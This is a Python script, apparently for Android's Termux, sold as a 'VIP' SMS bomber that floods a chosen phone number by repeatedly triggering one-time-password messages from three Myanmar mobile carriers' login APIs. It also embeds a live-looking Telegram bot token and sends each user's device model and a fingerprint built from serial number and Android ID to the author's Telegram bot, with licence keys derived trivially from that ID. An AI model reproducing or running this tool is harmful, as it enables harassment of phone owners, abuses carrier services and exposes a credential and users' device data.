#!/usr/bin/env python3
import requests, time, sys, hashlib, os, platform, subprocess, json, random, threading
from concurrent.futures import ThreadPoolExecutor

# --- CONFIGURATION ---
BOT_TOKEN = "8700243285:AAEvVldxc_YeDqZ6FItFnWhcg-18kexzFnw"
KEY_FILE = os.path.join(os.path.expanduser("~"), ".shine_vip_key.json")
CHANNEL_LINK = "https://t.me/shinekokoshinekoko" 

# Colors
G = "\033[1;32m"
R = "\033[1;31m"
W = "\033[1;37m"
Y = "\033[1;33m"
C = "\033[1;36m"
M = "\033[1;35m"
X = "\033[0m"

def clear_screen():
    os.system('cls' if platform.system() == 'Windows' else 'clear')

def play_sound():
    try:
        os.system('termux-vibrate -d 100')
    except: pass

def flag_animation():
    # Step 1: Draw the 3 color bands (Yellow, Green, Red)
    # Proportions: 50 chars wide, 9 chars high
    bands = [
        (Y, "██████████████████████████████████████████████████"),
        (Y, "██████████████████████████████████████████████████"),
        (Y, "██████████████████████████████████████████████████"),
        (G, "██████████████████████████████████████████████████"),
        (G, "██████████████████████████████████████████████████"),
        (G, "██████████████████████████████████████████████████"),
        (R, "██████████████████████████████████████████████████"),
        (R, "██████████████████████████████████████████████████"),
        (R, "██████████████████████████████████████████████████")
    ]
    
    print(f"{W}┌──────────────────────────────────────────────────┐")
    for color, band in bands:
        print(f"│{color}{band}{W}│")
        time.sleep(0.1)
    print(f"{W}└──────────────────────────────────────────────────┘")
    
    # Step 2: Draw the large star in the middle step by step
    # Center is roughly row 5, col 25
    star_steps = [
        (2, 25, "★"),
        (3, 23, "★★★"),
        (4, 21, "★★★★★"),
        (5, 19, "★★★★★★★"),
        (6, 21, "★★★★★"),
        (7, 23, "★★★"),
        (8, 25, "★")
    ]
    
    for row, col, star in star_steps:
        move_up = 11 - row
        sys.stdout.write(f"\033[{move_up}A") # Move cursor up
        sys.stdout.write(f"\033[{col}C") # Move cursor right
        sys.stdout.write(f"{W}{star}")
        sys.stdout.write(f"\033[{move_up}B") # Move cursor back down
        sys.stdout.write("\r")
        sys.stdout.flush()
        time.sleep(0.3)
    sys.stdout.write("\n")
    sys.stdout.flush()

def static_flag():
    # High-quality static flag for menu
    print(f"{W}┌──────────────────────────────────────────────────┐")
    print(f"│{Y}██████████████████████████████████████████████████{W}│")
    print(f"│{Y}██████████████████████████████████████████████████{W}│")
    print(f"│{Y}██████████████████████████████████████████████████{W}│")
    print(f"│{G}████████████████████████{W}★{G}████████████████████████{W}│")
    print(f"│{G}████████████████████████{W}★{G}████████████████████████{W}│")
    print(f"│{G}████████████████████████{W}★{G}████████████████████████{W}│")
    print(f"│{R}██████████████████████████████████████████████████{W}│")
    print(f"│{R}██████████████████████████████████████████████████{W}│")
    print(f"│{R}██████████████████████████████████████████████████{W}│")
    print(f"{W}└──────────────────────────────────────────────────┘")

def hacker_intro():
    clear_screen()
    flag_animation()
    print(G) 
    ascii_art = r"""
    ███████╗██╗  ██╗██╗███╗   ██╗███████╗██╗  ██╗ ██████╗ 
    ██╔════╝██║  ██║██║████╗  ██║██╔════╝██║ ██╔╝██╔═══██╗
    ███████╗███████║██║██╔██╗ ██║█████╗  █████╔╝ ██║   ██║
    ╚════██║██╔══██║██║██║╚██╗██║██╔══╝  ██╔═██╗ ██║   ██║
    ███████║██║  ██║██║██║ ╚████║███████╗██║  ██╗╚██████╔╝
    ╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ 
    """
    print(ascii_art)
    play_sound()
    time.sleep(0.5)
    print(f"{W}[*]{G} INITIALIZING CORE SYSTEMS... [OK]")
    print(f"{W}[*]{G} ESTABLISHING SECURE CONNECTION... [SUCCESS]")
    print(f"{W}" + "="*60)
    prefix = "STABILIZING ACCESS"
    total = 100
    for i in range(total + 1):
        filled_length = int(30 * i // total)
        bar = '█' * filled_length + '░' * (30 - filled_length)
        sys.stdout.write(f'\r{G}[+] {prefix}: [{bar}] {i}% ')
        sys.stdout.flush()
        time.sleep(0.01)
    print("\n" + f"{W}" + "="*60 + "\n")
    time.sleep(0.5)

def get_model():
    try:
        model = subprocess.getoutput('getprop ro.product.model').strip()
        if not model or "not found" in model.lower():
            model = platform.machine()
        return model
    except:
        return platform.system()

def get_id():
    try:
        serial = subprocess.getoutput('getprop ro.serialno').strip()
        android_id = subprocess.getoutput('settings get secure android_id').strip()
        cpu = platform.processor()
        combined_info = f"{serial}-{android_id}-{cpu}-{platform.node()}"
        return "DEV-" + hashlib.md5(combined_info.encode()).hexdigest().upper()[:8]
    except:
        return "DEV-" + hashlib.md5(platform.node().encode()).hexdigest().upper()[:8]

def loading_bar(iteration, total, prefix='Sending', length=30):
    percent = ("{0:.1f}").format(100 * (iteration / float(total)))
    filled_length = int(length * iteration // total)
    bar = '█' * filled_length + '░' * (length - filled_length)
    sys.stdout.write(f'\r{G}[*] {prefix}... [{bar}] {percent}% {X}')
    sys.stdout.flush()
    if iteration == total:
        print()

def banner():
    clear_screen()
    static_flag()
    print(f"{G}")
    print(r"  ____  _   _ ___ _   _ _____   _  _____  _  _____  ")
    print(r" / ___|| | | |_ _| \ | | ____| | |/ / _ \| |/ / _ \ ")
    print(r" \___ \| |_| || ||  \| |  _|   | ' / | | | ' / | | |")
    print(r"  ___) |  _  || || |\  | |___  | . \ |_| | . \ |_| |")
    print(r" |____/|_| |_|___|_| \_|_____| |_|\_\___/|_|\_\___/ ")
    print(f"          {Y}>>> {W}ShineKoko VIP SMS Tool {Y}<<<{X}")
    print(f"{W}╔══════════════════════════════════════════════════╗")
    d_id = get_id()
    model = get_model()
    print(f"  {G}•{W} Device ID : {C}{d_id}{W}")
    print(f"  {G}•{W} Model     : {W}{model}{W}")
    saved = get_saved_key()
    if is_key_valid(saved, d_id):
        print(f"  {G}•{W} VIP Status: {G}Active{W}")
    else:
        print(f"  {G}•{W} VIP Status: {R}Inactive{W}")
    print(f"{W}╚══════════════════════════════════════════════════╝{X}")
    return d_id, model

def save_key(key):
    data = {"key": key, "activated_at": time.time()}
    try:
        with open(KEY_FILE, "w") as f:
            json.dump(data, f)
    except: pass

def get_saved_key():
    if os.path.exists(KEY_FILE):
        try:
            with open(KEY_FILE, "r") as f:
                return json.load(f)
        except: pass
    return None

def is_key_valid(key_data, d_id):
    if not key_data: return False
    key = key_data.get("key", "")
    activated_at = key_data.get("activated_at", 0)
    if not (key.startswith("SHINE-") and d_id in key):
        return False
    try:
        if "-H1" in key: expiry_time = activated_at + 3600
        else:
            days = int(key.split("-D")[-1])
            expiry_time = activated_at + (days * 24 * 60 * 60)
        return time.time() < expiry_time
    except: pass
    return False

def send_tg(d_id, model):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        resp = requests.get(url).json()
        if resp.get("result"):
            chat_id = resp["result"][-1]["message"]["chat"]["id"]
            msg = (f"🚨 New VIP Request 🚨\nModel: {model}\nID: {d_id}\n\nKeys:\n1D: SHINE-{d_id}-D1\n3D: SHINE-{d_id}-D3\n7D: SHINE-{d_id}-D7")
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": chat_id, "text": msg})
    except: pass

def auth(d_id, model):
    saved = get_saved_key()
    if is_key_valid(saved, d_id): return True
    send_tg(d_id, model)
    while True:
        banner()
        print(f"{Y}[!] Access Required!{X}")
        print(f"{W}Channel: {CHANNEL_LINK}{X}")
        key = input(f"\n{W}[?]{G} Enter VIP Key: {W}").strip()
        if is_key_valid({"key": key, "activated_at": time.time()}, d_id):
            save_key(key)
            return True
        print(f"{R}[!] Invalid Key!{X}")
        time.sleep(2)

# --- SMS API FUNCTIONS ---
def call_mytel(phone):
    try:
        requests.get(f"https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={phone}", timeout=5)
    except: pass

def call_atom(phone):
    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        requests.get(f"https://www.atom.com.mm/api/otp/send?msisdn={phone}", headers=headers, timeout=5)
    except: pass

def call_ooredoo(phone):
    try:
        headers = {'Content-Type': 'application/json'}
        requests.post("https://www.ooredoo.com.mm/api/v1/otp/send", json={"phone": phone}, headers=headers, timeout=5)
    except: pass

def start_bombing(p, c, op):
    print(f"\n{W}[*] Starting SMS Bomber for {C}{p}{W}...")
    for i in range(c):
        try:
            if op == '1': call_mytel(p)
            elif op == '2': call_atom(p)
            elif op == '3': call_ooredoo(p)
            else:
                call_mytel(p)
                call_atom(p)
                call_ooredoo(p)
        except: pass
        loading_bar(i + 1, c)
        time.sleep(0.5)
    print(f"\n{G}[+] Finished!{X}")
    input(f"\n{W}Press Enter to return...{X}")

def main_menu(d_id, model):
    while True:
        banner()
        print(f"  {W}[1] SMS TOOL (START BOMBING)")
        print(f"  {W}[2] MY PROFILE")
        print(f"  {R}[0] EXIT")
        choice = input(f"\n{W}[?]{G} Select: {W}").strip()
        if choice == '1':
            while True:
                banner()
                print(f"  {G}[1] MYTEL API")
                print(f"  {G}[2] ATOM API")
                print(f"  {G}[3] OOREDOO API")
                print(f"  {G}[4] ALL OPERATORS")
                print(f"  {R}[b] BACK")
                op = input(f"\n{W}[?]{G} Select Operator: {W}").strip()
                if op.lower() == 'b': break
                p = input(f"\n{W}[?]{G} Target Phone: {C}")
                try:
                    c = int(input(f"{W}[?]{G} Count: {W}"))
                    start_bombing(p, c, op)
                except: pass
        elif choice == '2':
            banner()
            print(f"\n{C}╔══════════════════════════════════════════════════╗")
            print(f"  {G}•{W} Device ID   : {C}{d_id}")
            print(f"  {G}•{W} Phone Model : {W}{model}")
            saved = get_saved_key()
            if saved:
                key = saved.get("key", "N/A")
                act_at = datetime.fromtimestamp(saved.get("activated_at", 0)).strftime('%Y-%m-%d %H:%M:%S')
                print(f"  {G}•{W} VIP Key     : {Y}{key}")
                print(f"  {G}•{W} Activated   : {W}{act_at}")
                print(f"  {G}•{W} VIP Status  : {G}Active")
            else:
                print(f"  {G}•{W} VIP Status  : {R}Inactive")
            print(f"{C}╚══════════════════════════════════════════════════╝{X}")
            input(f"\n{W}Press Enter to return...{X}")
        elif choice == '0': sys.exit()

if __name__ == '__main__':
    from datetime import datetime
    hacker_intro()
    d_id, model = banner()
    if auth(d_id, model):
        main_menu(d_id, model)
